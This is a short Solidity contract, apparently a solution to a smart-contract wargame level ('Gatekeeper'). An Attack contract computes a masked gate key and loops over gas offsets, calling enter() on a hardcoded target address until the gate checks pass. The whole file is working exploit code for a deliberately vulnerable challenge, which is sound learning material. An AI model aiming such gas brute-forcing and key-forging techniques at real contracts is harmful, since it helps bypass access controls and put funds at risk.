// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;
interface Gatekeeper {
 function enter(bytes8 _gateKey) external returns (bool);
}


contract Attack {
     bytes8 ans = 0x78aBb0d784420462;
     bytes8 key = ans & 0xFFFFFFFF0000FFFF;
                  
     
     Gatekeeper gkp = Gatekeeper(0x4d226D100CF0DEB31072543da1bbE984F3979625);

     function completeLevel()  public {
         for(uint i=0;i<300;i++) {
        (bool result, bytes memory data) = address(gkp).call{gas:i+8191*3}(abi.encodeWithSignature("enter(bytes8)",key));
         if(result) {
             break;
         }
         }
    }
}
